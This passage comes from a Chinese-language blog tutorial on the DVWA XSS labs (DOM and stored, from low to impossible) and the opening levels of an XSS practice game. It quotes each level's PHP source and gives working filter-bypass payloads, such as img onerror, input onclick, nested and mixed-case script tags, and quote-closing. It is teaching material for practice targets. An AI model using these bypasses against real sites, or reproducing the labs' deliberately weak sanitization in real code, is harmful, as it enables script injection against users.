class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对<code>default</code>变量进行了过滤，通过<code>stripos()</code> 函数查找<code>&lt;script</code>字符串在<code>default</code>变量值中第一次出现的位置（不区分大小写），如果匹配搭配的话手动通过<code>location</code>将URL后面的参数修正为<code>?default=English</code>，同样这里可以通过其他的标签搭配事件来达到弹窗的效果。</p><p>闭合<code>&lt;option&gt;</code>和<code>&lt;select&gt;</code>，然后使用<code>&lt;img&gt;</code>标签通过事件来弹窗</p><p><strong>payload1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=English&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure><blockquote><p>子节点<code>&lt;/option&gt;</code>和父节点<code>&lt;/select&gt;</code>都要闭合<br>直接利用<code>&lt;input&gt;</code>的事件来弹窗</p></blockquote><p><strong>payload2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=English&lt;input onclick=alert(&apos;XSS&apos;) /&gt;</span><br></pre></td></tr></table></figure><h2 id="DOM-XSS-high"><a href="#DOM-XSS-high" class="headerlink" title="DOM XSS high"></a>DOM XSS high</h2><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">'default'</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"French"</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"English"</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"German"</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"Spanish"</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用了白名单模式，如果<code>default</code>的值不为”French”、”English”、”German”、”Spanish”的话就重置URL为:</p><p><code>?default=English</code> ，这里只是对default的变量进行了过滤。</p><p>可以使用<code>&amp;</code>连接另一个自定义变量来Bypass</p><p><strong>payload1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">?default=English&amp;a=&lt;input onclick=alert(&apos;XSS&apos;) /&gt;</span><br></pre></td></tr></table></figure><p>也可以使用<code>#</code>来Bypass</p><p><strong>payload2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">?default=English#&lt;input onclick=alert(&apos;XSS&apos;) /&gt;</span><br></pre></td></tr></table></figure><h2 id="DOM-XSS-Impossible"><a href="#DOM-XSS-Impossible" class="headerlink" title="DOM XSS Impossible"></a>DOM XSS Impossible</h2><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For the impossible level, don't decode the querystring</span></span><br><span class="line">$decodeURI = <span class="string">"decodeURI"</span>;</span><br><span class="line"><span class="keyword">if</span> ($vulnerabilityFile == <span class="string">'impossible.php'</span>) &#123;</span><br><span class="line">    $decodeURI = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Impossible</code>级别直接不对我们的输入参数进行URL解码了，这样会导致标签失效，从而无法XSS</p><h2 id="存储-XSS-LOW"><a href="#存储-XSS-LOW" class="headerlink" title="存储 XSS LOW"></a>存储 XSS LOW</h2><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h3><p><strong>语法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trim(string,charlist)</span><br></pre></td></tr></table></figure><p><strong>细节</strong></p><p>移除string字符两侧的预定义字符。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要检查的字符串。</td></tr><tr><td>charlist</td><td>可选。规定从字符串中删除哪些字符</td></tr></tbody></table><p><code>charlist</code>如果被省略，则移除以下所有字符：</p><table><thead><tr><th>符号</th><th>解释</th></tr></thead><tbody><tr><td>\0</td><td>NULL</td></tr><tr><td>\t</td><td>制表符</td></tr><tr><td>\n</td><td>换行</td></tr><tr><td>\x0B</td><td>垂直制表符</td></tr><tr><td>\r</td><td>回车</td></tr><tr><td></td><td>空格</td></tr></tbody></table><h3 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes"></a>stripslashes</h3><p><strong>语法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stripslashes(string)</span><br></pre></td></tr></table></figure><p><strong>细节</strong></p><p>去除掉string字符的反斜杠<code>\</code>，该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。</p><h3 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string"></a>mysql_real_escape_string</h3><p><strong>语法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string(string,connection)</span><br></pre></td></tr></table></figure><p><strong>细节</strong></p><p>转义 SQL 语句中使用的字符串中的特殊字符。</p><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">string</td><td style="text-align:left">必需。规定要转义的字符串。</td></tr><tr><td style="text-align:left">connection</td><td style="text-align:left">可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</td></tr></tbody></table><p>下列字符受影响：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul><p>以上这些函数都只是对数据库进行了防护，却没有考虑到对XSS进行过滤，所以依然可以正常的来XSS</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name: sqlsec</span><br><span class="line">Message: &lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以看到我们的payload直接插入到了数据库中了：</p><p><img src="http://qiniuyun.lintstar.top/1555576102908.png" alt="1555576102908"></p><p>测试完成的话为了不影响下面题目的测试，这里建议手动从数据库中删除下这条记录。</p><h2 id="存储-XSS-Medium"><a href="#存储-XSS-Medium" class="headerlink" title="存储 XSS Medium"></a>存储 XSS Medium</h2><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h3><p><strong>语法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes(string)</span><br></pre></td></tr></table></figure><p><strong>细节</strong></p><p>返回在预定义字符之前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul><h3 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags"></a>strip_tags</h3><p><strong>语法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strip_tags(string,allow)</span><br></pre></td></tr></table></figure><p><strong>细节</strong></p><p>剥去字符串中的 HTML、XML 以及 PHP 的标签。</p><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><em>string</em></td><td style="text-align:left">必需。规定要检查的字符串。</td></tr><tr><td style="text-align:left"><em>allow</em></td><td style="text-align:left">可选。规定允许的标签。这些标签不会被删除。</td></tr></tbody></table><h3 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h3><p><strong>语法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars(string,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure><p><strong>细节</strong></p><p>把预定义的字符转换为 HTML 实体。</p><p>预定义的字符是：</p><ul><li>&amp; （和号）成为 <code>&amp;</code></li><li>“ （双引号）成为 <code>&quot;</code></li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 <code>&lt;</code></li><li>> （大于）成为 <code>&gt;</code></li></ul><p><code>message</code> 变量几乎把所有的XSS都给过滤了，但是<code>name</code>变量只是过滤了<code>&lt;script&gt;</code>标签而已，我们依然可以在<code>name</code>参数尝试使用其他的标签配合事件来触发弹窗。</p><p><code>name</code>的input输入文本框限制了长度：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"txtName"</span> <span class="attr">size</span>=<span class="string">"30"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>审查元素手动将<code>maxlength</code>的值调大一点就可以了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"txtName"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">maxlength</span>=<span class="string">"50"</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name: &lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">Message: www.sqlsec.com</span><br></pre></td></tr></table></figure><p>可以看到我们的payload直接插入到了数据库中了：</p><p><img src="http://qiniuyun.lintstar.top/1555575984473.png" alt="1555575984473"></p><p>因为<code>name</code>过滤规则的缺陷，同样使用<strong>嵌套构造</strong>和<strong>大小写转换</strong>也是可以Bypass的：</p><p><strong>paylaod2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Name: &lt;Script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br><span class="line">Message: www.sqlsec.com</span><br><span class="line"></span><br><span class="line">Name: &lt;s&lt;script&gt;cript&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br><span class="line">Message: www.sqlsec.com</span><br></pre></td></tr></table></figure><p>测试完成的话为了不影响下面题目的测试，这里建议手动从数据库中删除下这些记录。</p><h2 id="存储-XSS-high"><a href="#存储-XSS-high" class="headerlink" title="存储 XSS high"></a>存储 XSS high</h2><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>message</code>变量依然是没有什么希望，重点分析下<code>name</code>变量，发现仅仅使用了如下规则来过滤，所以依然可以使用其他的标签来Bypass</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $name );</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name: &lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">Message: www.sqlsec.com</span><br></pre></td></tr></table></figure><h2 id="存储-XSS-Impossible"><a href="#存储-XSS-Impossible" class="headerlink" title="存储 XSS Impossible"></a>存储 XSS Impossible</h2><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = stripslashes( $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $name = htmlspecialchars( $name );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':message'</span>, $message, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':name'</span>, $name, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>message</code>和<code>name</code>变量都进行了严格的过滤，而且还检测了用户的token：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure><p>有效地防止了CSRF的攻击</p><h1 id="XSS小游戏习题讲解"><a href="#XSS小游戏习题讲解" class="headerlink" title="XSS小游戏习题讲解"></a>XSS小游戏习题讲解</h1><h2 id="第1关-无任何过滤措施"><a href="#第1关-无任何过滤措施" class="headerlink" title="第1关 无任何过滤措施"></a>第1关 无任何过滤措施</h2><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户:"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>name变量通过<strong>GET</strong>方式传入，直接带入到<code>&lt;h2&gt;</code>标签中，没有任何过滤。</p><p><strong>payload</strong></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level1.php?name=&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="第2关-闭合双引号"><a href="#第2关-闭合双引号" class="headerlink" title="第2关 闭合双引号"></a>第2关 闭合双引号</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>keyword变量通过<strong>GET</strong>方式传入，赋值给<code>$str</code>变量，然后带入到<code>&lt;h2&gt;</code>标签中和<code>&lt;input&gt;</code>标签。 <code>&lt;h2&gt;</code>标签经过了<code>htmlspecialchars($str)</code>编码，<code>&lt;input&gt;</code>标签没有任何过滤，所以尝试在<code>&lt;input&gt;</code>标签中闭合双引号<code>&quot;</code>，来触发事件。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure><h2 id="第3关-闭合单引号"><a href="#第3关-闭合单引号" class="headerlink" title="第3关 闭合单引号"></a>第3关 